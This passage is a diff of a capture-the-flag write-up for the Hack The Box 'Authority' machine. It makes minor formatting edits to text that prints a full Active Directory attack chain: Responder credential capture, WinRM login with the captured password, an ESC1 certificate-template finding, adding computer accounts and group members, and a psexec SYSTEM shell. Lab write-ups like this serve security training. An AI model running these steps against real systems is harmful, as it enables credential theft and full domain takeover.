@@ -357,7 +357,7 @@ In LDAP connection config we got the hostname `authority.authority.htb` and the 
 
 We can now use reponder to grab the ldap credentials. We will open responder and start listning on the tun0 interface and port 389.
 
-$sudo responder -I tun0
+`$sudo responder -I tun0`
 
 <SNIP>
 
@@ -377,7 +377,6 @@ using netexec winrm we can test the credentials and we can see that we can get s
 $netexec winrm 10.10.11.222 -u svc_ldap -p 'lDaP_1n_th3_cle4r!'
 WINRM       10.10.11.222    5985   AUTHORITY        [*] Windows 10 / Server 2019 Build 17763 (name:AUTHORITY) (domain:authority.htb)
 WINRM       10.10.11.222    5985   AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! (Pwn3d!)
-
 ```
 ### Evil-winrm
 
@@ -477,7 +476,6 @@ Certificate Templates
                                           AUTHORITY.HTB\Administrator
     [!] Vulnerabilities
       ESC1                              : 'AUTHORITY.HTB\\Domain Computers' can enroll, enrollee supplies subject and template allows client authentication
-
 ```
 It identifies a template `CorpVPN` and this is vulnerable to `ESC1`.
 
@@ -500,7 +498,6 @@ SMB         10.10.11.222    445    AUTHORITY        [*] Windows 10 / Server 2019
 LDAPS       10.10.11.222    636    AUTHORITY        [+] authority.htb\svc_ldap:lDaP_1n_th3_cle4r! 
 MAQ         10.10.11.222    389    AUTHORITY        [*] Getting the MachineAccountQuota
 MAQ         10.10.11.222    389    AUTHORITY        MachineAccountQuota: 10
-
 ```
 This means we can add upto 10 computers. We can add computers using `impacket-addcomputer`.
 
@@ -563,10 +560,10 @@ add_user_to_group user group - Adds a user to a group.
 
 # add_user_to_group svc_ldap administrators
 Adding user: svc_ldap to group Administrators result: OK
-
 ```
 
 svc-ldap has been added to the administrator group. We can use psexec to confim that we can login as administrator.
+
 ```bash
 impacket-psexec authority.htb/svc_ldap:'lDaP_1n_th3_cle4r!'@10.10.11.222 
 Impacket v0.12.0 - Copyright Fortra, LLC and its affiliated companies 
@@ -583,5 +580,4 @@ Microsoft Windows [Version 10.0.17763.4644]
 
 C:\Windows\system32> whoami
 nt authority\system
-
 ```
